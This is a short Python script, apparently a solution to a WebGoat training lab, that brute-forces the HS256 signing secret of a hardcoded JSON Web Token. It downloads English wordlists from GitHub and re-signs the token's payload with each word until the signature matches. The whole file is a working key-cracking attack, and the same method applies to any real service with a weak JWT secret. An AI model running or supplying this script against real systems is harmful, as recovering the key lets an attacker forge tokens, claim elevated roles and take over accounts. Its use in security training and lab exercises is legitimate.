import jwt
import base64
import json
from collections import OrderedDict
import os
'''Script for bruteforcing the JWT (Json Web Token)'''

def download_dictionnary():
    git_command = 'git clone https://github.com/first20hours/google-10000-english'
    os.system(git_command)

def set_dictionnaries(dictionnaries):

    if not os.path.isdir('./google-10000-english/'):
        print('Dictionnaries not found... Downloading them')
        download_dictionnary()

    dictionnaries.append('20k.txt')
    dictionnaries.append('google-10000-english-no-swears.txt')
    dictionnaries.append('google-10000-english.txt')
    dictionnaries.append('google-10000-english-usa-no-swears-long.txt')
    dictionnaries.append('google-10000-english-usa-no-swears-medium.txt')
    dictionnaries.append('google-10000-english-usa-no-swears-short.txt')
    dictionnaries.append('google-10000-english-usa-no-swears.txt')
    dictionnaries.append('google-10000-english-usa.txt')


if __name__ == '__main__':
    
    #setting the dictionnaries to use
    dictionnaries = [] 
    set_dictionnaries(dictionnaries)

    #creating payload for used to bruteforce the JWT
    payload = '{"iss":"WebGoat Token Builder","iat":1524210904,\
            "exp":1618905304,"aud":"webgoat.org","sub":"tom@webgoat.com",\
            "username":"Tom","Email":"tom@webgoat.com","Role":["Manager","Project Administrator"]}'
    
    #converting payloads to json
    payload = json.loads(payload, object_pairs_hook=OrderedDict)
    
    #jwt to be compared to 
    jwt_data = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQuY29tIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.vPe-qQPOt78zK8wrbN1TjNJj3LeX9Qbch6oo23RUJgM'
    
    #running over dictionnaries
    for dict in dictionnaries:

        #selecting a dictionnary file from the list
        with open('google-10000-english/'+str(dict),'r') as file:
            for key in file:

                #removing the last bad character of the line
                key = key.strip()

                print(key)
                #computing the jwt with the new key
                encoded = jwt.encode(payload, key, algorithm='HS256')

                #if the good key is found
                if str(encoded) == str(jwt_data):
                    print('The key is ' + key)
                    exit(0)
    
                print(encoded)
            file.close()
            
    
    
